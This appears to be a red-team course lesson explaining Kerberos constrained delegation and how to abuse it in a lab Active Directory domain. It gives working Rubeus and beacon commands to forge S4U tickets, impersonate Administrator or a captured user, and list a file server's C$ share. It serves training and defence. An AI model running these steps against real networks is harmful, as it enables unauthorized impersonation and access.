# Constrained Delegation

The Service for User (S4U) Kerberos extension was introduced in Server 2003 as a replacement for the rather problematic unconstrained delegation.  It provides two new protocols:

* Service for User to Proxy (S4U2proxy).  This allows a service to obtain a service ticket on behalf of a user to a different service (e.g. an HTTP service requesting a service ticket to the MSSQLSvc service).  This is known as "constrained delegation".
* Service for User to Self (S4U2self).  This allows a service to obtain a service ticket on behalf of a user to itself.  This is intended to be used when a user authenticates to the service in a way other than Kerberos.  The service can perform an S4U2self to get a service ticket for the user as though they did authenticate using Kerberos, and then use that with S4U2proxy to get a service ticket for another service.  This is known as "protocol transition".

The main difference from unconstrained delegation is that S4U attempts to limit the services to which another service can delegate access.  That is to say, instead of being able to request service tickets for any service in the domain, it is limited to the SPNs specified in the configuration.  It also does not rely on the service needing the TGT of a user to work.

Rather than using the TRUSTED\_FOR\_DELEGATION flag, constrained delegation is configured via the `msDS-AllowedToDelegateTo` attribute of the computer object.  This is a list of SPNs that the computer is allowed to delegate to, e.g. `{ MSSQLSvc/cont-sql-1, ... }`.

These computers can be enumerated using a tool such as `ldapsearch`.

```batch
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1
```

### Kerberos only <a href="#el_1737475317828_717" id="el_1737475317828_717"></a>

When only Kerberos authentication is enabled (which is the default), the client sends a TGS-REQ for the front-end service and receives a TGS-REP as normal.  The service is then accessed by sending the service ticket in the AP-REQ.  The service will cache the user's service ticket in memory so it can be used later.When the front-end service needs to access a back-end service on behalf of the user, it sends a TGS-REQ to the KDC asking for a service ticket to the target SPN, and includes a copy of the user's cached service ticket.The KDC will verify that the msDS-AllowedToDelegateTo attribute of the computer making the request contains the SPN it's requesting a ticket for.  If it is, it returns the service ticket.  The front-end server will then use this service ticket to authenticate to the back-end service as the user.This is S4U2proxy.

### Protocol transition <a href="#el_1737475326737_732" id="el_1737475326737_732"></a>

Protocol transition is disabled unless the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag on the UserAccountControl attribute of the computer object is explicitly set.  You can grab the current value and compare it to the documented [property flags](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties).  The default UAC value for a computer is 4096 (`WORKSTATION_TRUST_ACCOUNT`).  If this value comes back any different then you know some additional flags are set.

```batch
beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl

userAccountControl: 16781312
```

You can check if a particular flag is set by performing a bitwise AND with current UAC value and the value of a flag.  The decimal value for TRUSTED\_TO\_AUTH\_FOR\_DELEGATION is 16777216, so we would do `[System.Convert]::ToBoolean(16781312 -band 16777216)` in PowerShell, which returns `True`.  If a flag is not set, it would obviously return `False`.

In these scenarios, users will likely authenticate to the front-end service using a protocol other then Kerberos, such as NTLM.  Because of this, the front-end server does not have access to the user's service ticket as described when 'Kerberos only' is in use.

Instead, the server will send a TGS-REQ containing the user's username and sets the SPN to be the computer's own SamAccountName (e.g. _pchilds@lon-ws-1$_); and the KDC returns the service ticket in a TGS-REP.

This is S4U2self.  The service ticket that gets returned can then be used in a S4U2proxy request as above.

### Attacking S4U <a href="#el_1737541469923_531" id="el_1737541469923_531"></a>

If an adversary is able to compromise a computer configured for constrained delegation, then they may be able request service tickets for the service(s) listed in its msDS-AllowedToDelegateTo attribute.  However, the procedure will vary depending on whether protocol transition is enabled or not.  The easier case is when it is enabled.

#### With protocol transition <a href="#el_1737541703689_582" id="el_1737541703689_582"></a>

When protocol transition is enabled, the adversary can obtain a TGT for the computer account and use it to perform an S4U2self request.  They have complete freedom in what username they put in the TGS-REQ, so can impersonate any user in the domain.  The service ticket that's returned is forwardable, so can be used to perform an S4U2proxy request.  This will grant them with a valid service ticket to the target service, as the intended user.Rubeus is able to perform both the S4U2self and S4U2proxy steps in one `s4u` command.

{% code overflow="wrap" %}
```batch
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
```
{% endcode %}

Where:

* `/user` is the principal (e.g. computer) configured for the delegation.
* `/msdsspn` is the service that the principal is allowed to delegate to.
* `/ticket` is the TGT for the principal.
* `/impersonateuser` is the user we want to impersonate.

Rubeus will first use the principal's TGT to perform an S4U2self.

```batch
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=
```

If we pass this ticket to Rubeus `describe`, we'll see that the service name is the computer's own SamAccountName, the username is that of the user we want to impersonate, and the forwardable flag is set.

{% code overflow="wrap" %}
```batch
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=
```
{% endcode %}

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/d748f556e346211ebad97ac551e61b38.png" alt="" width="100%"><figcaption></figcaption></figure>

Rubeus will take this ticket for us and uses it to submit an S4U2proxy request for the service specified in the `/msdsspn` parameter.  The ticket we get back will be a usable service ticket for the impersonated user.

```batch
[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGf[...snip...]ZzLTE=
```

Since this is a service ticket for CIFS, we could use it to list the computer's C$ drive.

```batch
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]ZzLTE=
  
[*] Using CONTOSO.COM\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3380
[+] Ticket successfully imported!
[+] LUID            : 0x9b6c93
 
beacon> steal_token 3380
beacon> ls \\lon-fs-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     02/20/2025 10:37:21   Files
          dir     05/08/2021 08:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     01/24/2025 14:21:18   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/24/2025 14:18:02   System Volume Information
          dir     01/24/2025 14:17:49   Users
          dir     01/24/2025 13:34:02   Windows
 12kb     fil     02/20/2025 08:50:25   DumpStack.log.tmp
 1gb      fil     02/20/2025 08:50:25   pagefile.sys
```

#### Without protocol transition <a href="#el_1737541882892_627" id="el_1737541882892_627"></a>

The computer's TGT cannot be used to obtain a forwardable service ticket via S4U2self when protocol transition is not enabled.  The S4U2self will still return a ticket but the forwardable flag will not be set, and any attempt to use it with S4U2proxy will fail.

```batch
[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=
```

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/fc7a5d79239a0c52598399db249decee.png" alt="" width="100%"><figcaption></figcaption></figure>

```batch
[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
```

\
There was a vulnerability dubbed the '[Bronze Bit](https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-overview/)' which allowed an adversary to flip the forwardable bit in a ticket, magically making a non-forwardable ticket forwardable.  Unfortunately, this is now patched. Instead, the adversary must obtain a service ticket that a user has requested to gain access to the front-end service. This means that they cannot freely impersonate any user, but are limited to the user(s) for whom service tickets are available. These service tickets can be used directly with S4U2proxy, to obtain valid service tickets to the target service, as these users.

In this example, we have an HTTP service ticket for _dyork@HTTP/lon-ws-1_.

```batch
[*] Action: Describe Ticket

  ServiceName              :  HTTP/lon-ws-1
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  dyork (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  20/02/2025 18:58:24
  EndTime                  :  21/02/2025 04:57:43
  RenewTill                :  27/02/2025 18:57:43
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  ld5jNd1Dul9W0Dw6kVAQQBSnK72PdOhk9h3z97R0CJQ=
  
```

The procedure for this is to use the `/tgs` parameter in Rubeus, rather than `/impersonateuser`.

{% code overflow="wrap" %}
```batch
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap
```
{% endcode %}

Where:

* `/user` is the principal (e.g. computer) configured for the delegation.
* `/msdsspn` is the service that the principal is allowed to delegate to.
* `/ticket` is the TGT for the principal.
* `/tgs` is a captured front-end service ticket for a user.

```batch
[*] Action: S4U

[*] Loaded a TGS for CONTOSO.COM\dyork
[*] Impersonating user 'dyork' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGL[...snip...]mcy0x
```

This ticket can be used to access the CIFS service on _lon-fs-1_ as _dyork_.

```batch
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:doIGL[...snip...]mcy0x

[*] Using CONTOSO.COM\dyork:FakePass

[*] Showing process : False
[*] Username        : dyork
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2080
[+] Ticket successfully imported!
[+] LUID            : 0xa1c99b

beacon> steal_token 2080
beacon> ls \\lon-fs-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     02/20/2025 10:37:21   Files
          dir     05/08/2021 08:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     01/24/2025 14:21:18   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/24/2025 14:18:02   System Volume Information
          dir     01/24/2025 14:17:49   Users
          dir     01/24/2025 13:34:02   Windows
 12kb     fil     02/20/2025 10:50:16   DumpStack.log.tmp
 1gb      fil     02/20/2025 10:50:16   pagefile.sys
```
